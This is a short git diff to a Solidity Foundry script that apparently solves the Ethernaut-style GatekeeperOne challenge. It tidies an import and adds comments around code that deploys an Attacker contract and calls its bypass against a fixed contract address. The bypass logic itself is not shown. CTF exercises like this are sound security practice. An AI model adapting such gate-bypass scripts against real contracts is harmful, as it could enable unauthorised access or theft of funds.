@@ -2,7 +2,7 @@
 pragma solidity ^0.8.0;
 
 import {Script, console} from "forge-std/Script.sol";
-import "../src/GatekeeperOne.sol";
+import {GatekeeperOne} from "../src/GatekeeperOne.sol";
 
 contract Attacker {
     GatekeeperOne private immutable gatekeeper;
@@ -27,11 +27,17 @@ contract GatekeeperOneScript is Script {
 
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        
+        // Define the GatekeeperOne contract address
         GatekeeperOne gatekeeper = GatekeeperOne(0xC01F24955aa62651fa88E19E9fe4d01DF97F2911);
+
+        // Deploy the Attacker contract and pass the Gatekeeper contract address to it
         Attacker attacker = new Attacker(address(gatekeeper));
+
+        // Execute the bypass with the given gas parameter
         attacker.bypass(256);
+
         vm.stopBroadcast();
 
     }
 }
-
